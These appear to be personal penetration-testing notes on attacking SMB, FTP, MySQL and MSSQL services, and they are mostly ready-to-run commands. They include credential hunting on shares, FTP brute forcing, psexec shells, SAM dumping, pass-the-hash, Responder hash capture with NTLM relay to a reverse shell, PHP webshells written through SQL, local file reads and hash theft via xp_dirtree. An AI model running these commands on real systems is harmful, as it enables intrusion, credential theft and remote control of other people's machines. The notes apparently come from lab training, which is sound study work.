# Interacting with Common Services

## Server Message Block (SMB)

press `[WINKEY] + [R]` to open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`
### WIndows

#### Using CMD to Interact with smb

```cmd-session
dir \\192.168.220.129\Finance\
```

```cmd-session
net use n: \\192.168.220.129\Finance
```

```cmd-session
net use n: \\192.168.220.129\Finance /user:plaintext Password123
```
`Maps The Content of the Shared Drive to n drive`


```cmd-session
dir n: /a-d /s /b | find /c ":\"
```
`Tells You Hoow manny file are in the shared folder`


```cmd-session
dir n:\*cred* /s /b
```
`Find anything realted to creds`

```cmd-session
dir n:\*secret* /s /b
```

```cmd-session
findstr /s /i cred n:\*.*
```
`Using the findstr to find the creds`

#### USing powershell to interact with smb


```powershell-session
Get-ChildItem \\192.168.220.129\Finance\
```


```powershell-session
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```
`Dones the Samething as net use and maps the shared drive as n drive`

```powershell-session
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

```powershell-session
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
```
`Tells us how many files are in the shared drive`


```powershell-session
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

```powershell-session
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

### Linux


#### Linux - Mount

```shell-session
sudo mkdir /mnt/Finance
```
```shell-session
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```
`Mounts the shared drive on your macine`


```shell-session
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```
`We can give an Creds file to autheticate`
```txt
username=plaintext
password=Password123
domain=.
```
`THis is how the creds file should look like`

```shell-session
grep -rn /mnt/Finance/ -ie cred
```

```shell-session
find /mnt/Finance/ -name *cred*
```

## Email

```shell-session
sudo apt-get install evolution
```

## Databases

### MsSql

```shell-session
sqsh -S 10.129.20.13 -U username -P Password123
```
`using linux to authenticate to mssql`

```cmd-session
qlcmd -S 10.129.20.13 -U username -P Password123
```
`using cmd to authenticate to mssql`


### MySql

```shell-session
mysql -u username -pPassword123 -h 10.129.20.13
```
`Using linux to interact with mysql`

```cmd-session
mysql.exe -u username -pPassword123 -h 10.129.20.13
```
`Using cmd to interact with mysql`

```shell-session
sudo dpkg -i dbeaver-<version>.deb
```
```shell-session
dbeaver &
```
`Linux gui to interact with mysql and mssql etc`


# THe Concept of Attacks


![](../../attchments/Pasted%20image%2020251213162646.png)

The concept is based on four categories that occur for each vulnerability. First, we have a `Source` that performs the specific request to a `Process` where the vulnerability gets triggered. Each process has a specific set of `Privileges` with which it is executed. Each process has a task with a specific goal or `Destination` to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.

Every task and piece of information follows a specific pattern, a cycle, which we have deliberately made linear. This is because the `Destination` does not always serve as a `Source` and is therefore not treated as a source of a new task.

For any task to come into existence at all, it needs an idea, information (`Source`), a planned process for it (`Processes`), and a specific goal (`Destination`) to be achieved. Therefore, the category of `Privileges` is necessary to control information processing appropriately.


#### Initiation of the Attack

| **Step** | **Log4j**                                                                                                                                                               | **Concept of Attacks - Category** |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `1.`     | The attacker manipulates the user agent with a JNDI lookup command.                                                                                                     | `Source`                          |
| `2.`     | The process misinterprets the assigned user agent, leading to the execution of the command.                                                                             | `Process`                         |
| `3.`     | The JNDI lookup command is executed with administrator privileges due to logging permissions.                                                                           | `Privileges`                      |
| `4.`     | This JNDI lookup command points to the server created and prepared by the attacker, which contains a malicious Java class containing commands designed by the attacker. | `Destination`                     |

This is when the cycle starts all over again, but this time to gain remote access to the target system.

#### Trigger Remote Code Execution

| **Step** | **Log4j**                                                                                                                                    | **Concept of Attacks - Category** |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `5.`     | After the malicious Java class is retrieved from the attacker's server, it is used as a source for further actions in the following process. | `Source`                          |
| `6.`     | Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system.                           | `Process`                         |
| `7.`     | The malicious code is executed with administrator privileges due to logging permissions.                                                     | `Privileges`                      |
| `8.`     | The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely.              |                                   |





# Attacking FTP

```shell-session
sudo nmap -sC -sV -p 21 192.168.2.142 
```

```shell-session
ftp 192.168.2.142  
```

```shell-session
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```
`Brute forcing FTP with medusa`


```shell-session
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
`Nmap -b flag can be used to perform an FTP bounce attack:`

```shell-session
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```
`CoreFTP CVE Exploitation`

# Attacking SMB

### SMB commands

```shell-session
sudo nmap 10.129.14.128 -sV -sC -p139,445
```
`SMB enum using Nmap`

```shell-session
smbclient -N -L //10.129.14.128
```
` -N means NUll session`

```shell-session
smbmap -H 10.129.14.128 -r notes
```
`using SMBmap to recursively browse notes share`

```shell-session
smbmap -H 10.129.14.128 --download "notes\note.txt"
```
`Download using smbmap`

```shell-session
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
`Upload using SMBmap`

### RPC commands

```shell-session
rpcclient -U'%' 10.10.110.17
```
`NULL session on rpc`

```shell-session
./enum4linux-ng.py 10.10.11.45 -A -C
```
`automated enumration`


## SMB Vnln

### RCE

```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```
`Getteting an shell with an writable share`

```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
`Run COmmands using netexec -x to run cmd and -X to run powershell`

```shell-session
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

### SAM

```shell-session
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
`Extracting Sam databsae using Netexec`


### PTH

```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
`Pass the hash using Netexec`

## Forced Authentication Attacks


```shell-session
responder -I <interface name>
```
`Used to capture Hashes using Respomder`

```shell-session
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
`Crack NTMLv2 hashes using Hashcat`


`IF Unable to Crack the hash then we can relay it using the below`
```shell-session
cat /etc/responder/Responder.conf | grep 'SMB ='
```
`Turn off the smb`
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
`NTML Relay using impacket`
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershel -base64RevSHell'
```
`Execute an powershell rev shell using NTML relay`

 [Rev Shells Webite](https://www.revshells.com)

## Latest SMB VUln

One recent significant vulnerability that affected the SMB protocol was called [SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796) with the [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796).



# Attacking SQL Database

```shell-session
nmap -Pn -sV -sC -p1433 10.10.10.125
```
`Enumrating msSQL databse`

mysql = 3306

#### Privileges

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

- Read or change the contents of a database
    
- Read or change the server configuration
    
- Execute commands
    
- Read local files
    
- Communicate with other databases
    
- Capture the local system hash
    
- Impersonate existing users
    
- Gain access to other networks



```shell-session
mysql -u julio -pPassword123 -h 10.129.20.13
```
`Connecting to mysql server`


```cmd-session
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
`#### Connecting to the SQL Server`

```shell-session
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
`To Connect to MSSql from linux use sqsh`

```shell-session
mssqlclient.py -p 1433 julio@10.129.203.7
```
`Using mssqlclient from impacket to connect to mssql from linux`

```shell-session
SHOW DATABASES;
```

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```
`IF we are using sqlcmd`

```shell-session
USE htbusers;
```
`Select an database`

```shell-session
SHOW TABLES;
```

```cmd-session
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
```

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```

```shell-session
SELECT * FROM users;
```


## Executeing Commands

called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL
this is for mssql
How to enable xp_cmdshell ??

```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```


How to enable xp_cmdshell ??

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
`enable xp_cmdshell for mssql`

## Creating FIles

```shell-session
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
`Creating an Rev Shell using Mysql`

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```
`IF the Value of secure_file_piv value is Empty then we have read and write perm`


To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option),

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
`MSSQL Enableling Ole Automation Procedures so that we have write files perm`

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
`MSsql Rev Shell file Creating`

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```
`Read Local Files in MSSQL`

```shell-session
select LOAD_FILE("/etc/passwd");
```
`MySQL - Read Local Files in MySQL`

## Capture MSSQL Service Hash

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```
`XP_DIRTREE Hash Stealing`

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```
`XP_SUBDIRS Hash Stealing`


```shell-session
sudo responder -I tun0
```
`Hash Stealing with responder`


```shell-session
sudo impacket-smbserver share ./ -smb2support
```
`Hash stealing with an SMB server`


## Impersinate users in SQL

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```
`Identigy Which Users to Impersinate`


```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
`Identify If we are sysadmin or not IF the Above return 0 then we are not sysadmins`

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
`Impersenate as SA user`

